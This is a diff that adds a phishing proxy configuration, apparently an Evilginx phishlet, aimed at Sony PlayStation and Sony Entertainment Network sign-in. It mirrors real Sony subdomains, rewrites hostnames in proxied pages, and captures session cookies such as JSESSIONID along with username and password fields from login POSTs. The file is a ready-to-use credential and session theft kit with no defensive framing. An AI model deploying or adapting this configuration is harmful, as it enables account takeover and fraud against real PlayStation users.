@@ -1,0 +1,106 @@
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'id', orig_sub: 'id', domain: 'sonyentertainmentnetwork.com', session: true, is_landing: true}
+  - {phish_sub: 'auth.api', orig_sub: 'auth.api', domain: 'sonyentertainmentnetwork.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'playstation.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'playstation.com', session: true, is_landing: true}
+  - {phish_sub: 'secure.eu', orig_sub: 'secure.eu', domain: 'playstation.com', session: true, is_landing: true}
+  - {phish_sub: 'accounts.api', orig_sub: 'accounts.api', domain: 'playstation.com', session: true, is_landing: true}
+  - {phish_sub: 'smetrics.aem', orig_sub: 'smetrics.aem', domain: 'playstation.com', session: true, is_landing: true}
+  - {phish_sub: 'eventcom.api.np.km', orig_sub: 'eventcom.api.np.km', domain: 'playstation.net', session: true, is_landing: true}
+  - {phish_sub: 'commerce.api.np.km', orig_sub: 'commerce.api.np.km', domain: 'playstation.net', session: true, is_landing: true}
+  - {phish_sub: 'secure.api', orig_sub: 'secure.api', domain: 'sonyentertainmentnetwork.com', session: true, is_landing: true}
+  - {phish_sub: 'pdr-srlc.api', orig_sub: 'pdr-srlc.api', domain: 'sonyentertainmentnetwork.com', session: true, is_landing: true}
+ 
+
+#lengtmp+oszxh@gmail.com
+
+sub_filters:
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'id', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'id', domain: 'sonyentertainmentnetwork.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'pdr-srlc.api', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'pdr-srlc.api', domain: 'sonyentertainmentnetwork.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'pdr-srlc.api', domain: 'sonyentertainmentnetwork.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'auth.api', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'auth.api', domain: 'sonyentertainmentnetwork.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'www', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'www', domain: 'playstation.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'secure.eu', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'secure.eu', domain: 'playstation.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'accounts.api', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'accounts.api', domain: 'playstation.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'smetrics.aem', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'smetrics.aem', domain: 'playstation.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'eventcom.api.np.km', domain: 'playstation.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'eventcom.api.np.km', domain: 'playstation.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'eventcom.api.np.km', domain: 'playstation.net', search: 'https://eventcom.api.{{env}}.km.playstation.net/event/', replace: 'https://{hostname}/event/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'commerce.api.np.km', domain: 'playstation.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'commerce.api.np.km', domain: 'playstation.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'secure.api', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'secure.api', domain: 'sonyentertainmentnetwork.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'secure.api', domain: 'sonyentertainmentnetwork.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'pdr-srlc.api', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'pdr-srlc.api', domain: 'sonyentertainmentnetwork.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'id.sonyentertainmentnetwork.com', orig_sub: 'pdr-srlc.api', domain: 'sonyentertainmentnetwork.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'id', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'id', domain: 'sonyentertainmentnetwork.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'pdr-srlc.api', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'pdr-srlc.api', domain: 'sonyentertainmentnetwork.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'auth.api', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'auth.api', domain: 'sonyentertainmentnetwork.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'auth.api', domain: 'sonyentertainmentnetwork.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'www', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'www', domain: 'playstation.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'secure.eu', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'secure.eu', domain: 'playstation.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'accounts.api', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'accounts.api', domain: 'playstation.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'smetrics.aem', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'smetrics.aem', domain: 'playstation.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'eventcom.api.np.km', domain: 'playstation.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'eventcom.api.np.km', domain: 'playstation.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'auth.api.sonyentertainmentnetwork.com', orig_sub: 'eventcom.api.np.km', domain: 'playstation.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'www.playstation.com', orig_sub: 'id', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.playstation.com', orig_sub: 'id', domain: 'sonyentertainmentnetwork.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.playstation.com', orig_sub: 'pdr-srlc.api', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.playstation.com', orig_sub: 'pdr-srlc.api', domain: 'sonyentertainmentnetwork.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.playstation.com', orig_sub: 'auth.api', domain: 'sonyentertainmentnetwork.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.playstation.com', orig_sub: 'auth.api', domain: 'sonyentertainmentnetwork.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.playstation.com', orig_sub: 'www', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.playstation.com', orig_sub: 'www', domain: 'playstation.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.playstation.com', orig_sub: 'secure.eu', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.playstation.com', orig_sub: 'secure.eu', domain: 'playstation.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.playstation.com', orig_sub: 'accounts.api', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.playstation.com', orig_sub: 'accounts.api', domain: 'playstation.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.playstation.com', orig_sub: 'smetrics.aem', domain: 'playstation.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.playstation.com', orig_sub: 'smetrics.aem', domain: 'playstation.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.playstation.com', orig_sub: 'eventcom.api.np.km', domain: 'playstation.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.playstation.com', orig_sub: 'eventcom.api.np.km', domain: 'playstation.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+auth_tokens:
+  - domain: '.sonyentertainmentnetwork.com'
+    keys: ['bm_sz,opt','_abck,opt','s_cc,opt','s_sq']
+  - domain: 'auth.api.sonyentertainmentnetwork.com'
+    keys: ['JSESSIONID']
+  - domain: 'id.sonyentertainmentnetwork.com'
+    keys: ['akacd_pdr-id2-sencom-bdl,opt']
+       
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'id.sonyentertainmentnetwork.com'
+  path: '/signin/'
